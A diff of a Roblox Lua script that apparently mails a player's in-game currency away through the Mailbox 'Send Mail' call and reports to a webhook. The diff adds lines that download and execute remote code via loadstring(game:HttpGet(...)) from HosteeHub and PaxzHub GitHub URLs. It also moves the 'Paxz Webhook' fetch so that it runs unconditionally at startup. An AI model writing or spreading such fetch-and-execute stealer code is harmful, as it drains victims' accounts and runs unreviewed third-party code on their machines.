@@ -6,8 +6,12 @@ for i, v in pairs(game:GetService("CoreGui"):GetChildren()) do
 end
 
 
+
+
+
 loadstring(game:HttpGet("https://raw.githubusercontent.com/HosteeScriptz/HosteeHub/main/%E2%9C%97%20LoadingScreen%20%E2%9C%97"))()
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzHub/Paxz/main/Paxz%20Webhook"))()
 
 function sendWebhook(webhook, message)
     local webhookcheck =
@@ -67,7 +71,6 @@ for i, v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Frame
             }
             Networking.Invoke("Send Mail", unpack(args))
             dims = 0
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzHub/Paxz/main/Paxz%20Webhook"))()
             wait(7)
         end
     end
